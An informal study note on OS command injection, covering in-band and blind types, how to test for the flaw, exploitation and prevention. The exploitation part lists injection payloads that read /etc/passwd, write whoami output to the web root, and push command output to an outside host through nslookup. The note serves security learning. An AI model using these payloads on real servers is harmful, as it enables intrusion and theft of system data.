# what is?
OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.

# Conditions
in order to get vulnerable to command injection application need to satisfy 2 conditions

1. it uses a function that can execure system commands
2. the paramerter to that function us user controllable ie they come from client side

# Types of command Injection

1. In-band Command Injection - response is recived within http response 

2. Blind Comnmand Injection - does not recieve response within application response

# Impact
- Very often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, exploiting trust relationships to pivot the attack to other systems within the organization.

- Remote code execition

# Testing

Black Box approach

- Map the application
    map through all urls, pages accessible, make note of all input vectors, understand how application functions, try to figure logic of application and while you are doing all of it the burp proxy is interepting all request

    identify all instances where the web app appears to be interacting with underlying operating system 

- Fuzz the application
    fuzz the application with Command injection payloads, these payloads generally use shell metacharacters like
    shell metacharacters: &, &&, |, ||, ;, \n, `, $()

- for In-band command Injection analyze the response of application to determine if its vulnerable

- for Blind command Injection you need to be a bit creative

    - Trigger a time delay using the ping or sleep command
    
    - Exfilterate data by Outputing the response of command in a file in web root directory and then retrive file directly  
      using a browser
      lets say you run Dir command and then you redirect the output of dir command in a directory that is accessible by web root directory by anyone using the application and then if you see that file has got created and is availible for you to download that means attack workded, if not created then attack didnt worked

    - Open an out-of-band channel back to server you control usually done using burp collaborater

White Box approach

- perform combination of black box and white box testing
- Map all input vectors in application 
- Review source code to determine if any of the input vectors are addedd as parameters to function that execute system commands

# Exploiting

In band 

-  it is simple as concenating another command to the command orignally being run by application and you do this using shell   
   metacharacters
   example - 127.0.0.1 && cat /etc/passwd &, 
             127.0.0.1 & cat /etc/passwd &,
             127.0.0.1 || cat /etc/passwd &

Blind

- Trigger a time delay

    127.0.0.1 && sleep 10 &                 (sleep only works for unix)
    127.0.0.1 && ping -c 10 127.0.0.1 &      (ping works for both unix and wind)

- output the response of command in the web root and retrive file using browser, for example for whoami cammand

    127.0.0.1 & whoami > /var/www/static/whoami.txt &

- open a out-of-band channel back to a server you control

    127.0.0.1 & nslookup burpcollaborator.com

    127.0.0.1 & nslookup `whoami` burpcollaborator.com




# prevent

Primary Defence

- avoid calling OS commands from application-layer code directly, instead use build in library functions that are made to \    
  perform specific task and cant be manipulated to perform other tasks \
  
  for example: use mkdir instead of system("mkdir/dir_name")

  if its really necessory to use system commands then perform
  - whitelisting of permitted values
  - Validate that the input is as expected or valid input